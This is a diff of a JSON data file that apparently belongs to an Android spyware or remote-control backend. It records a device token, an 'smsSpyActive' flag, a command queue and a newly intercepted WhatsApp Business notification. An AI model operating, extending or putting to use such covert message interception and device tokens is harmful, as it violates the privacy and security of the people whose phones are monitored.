@@ -4,7 +4,7 @@
     "deviceName": "HP-TES123-74EC",
     "ownerUsername": "BLAY VIP",
     "token": "55a5b4006ca55171a079b79bc615ba6c",
-    "lastSeen": 1775459160535,
+    "lastSeen": 1775459175525,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-06T06:50:16.345Z",
@@ -2522,6 +2522,14 @@
     },
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WA Business",
+        "sender": "WhatsApp Business",
+        "content": "Memeriksa pesan baru",
+        "time": "06/04 14:06",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775459175982
+      },
       {
         "appName": "Messages",
         "sender": "",
